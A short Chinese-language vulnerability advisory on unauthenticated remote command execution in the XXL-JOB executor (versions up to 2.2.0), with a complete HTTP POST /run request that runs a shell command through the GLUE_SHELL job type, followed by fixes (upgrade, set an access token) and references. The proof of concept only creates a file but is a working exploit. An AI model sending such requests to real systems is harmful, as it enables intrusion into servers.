**### 一 漏洞描述
XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。  
现已开放源代码并接入多家公司线上产品线，开箱即用。  
XXL-JOB分为admin和executor两端，前者为后台管理页面，后者是任务执行的客户端。  
executor默认没有配置认证，未授权的攻击者可以通过RESTful API执行任意命令。**

影响范围: XXL-JOB <= 2.2.0

### 二 漏洞利用
POST /run HTTP/1.1
Host: your-ip:9999
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 365

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "touch /tmp/success",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}

### 三 漏洞修复
1 升级
2 设置accessToken  
https://www.xuxueli.com/xxl-job/#5.10%20%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%EF%BC%88AccessToken%EF%BC%89


> 参考链接  
> 复现: https://blog.csdn.net/ec_carrot/article/details/119839639  
> 挖掘: http://cn-sec.com/archives/178398.html
> 官方文档: https://www.xuxueli.com/xxl-job/
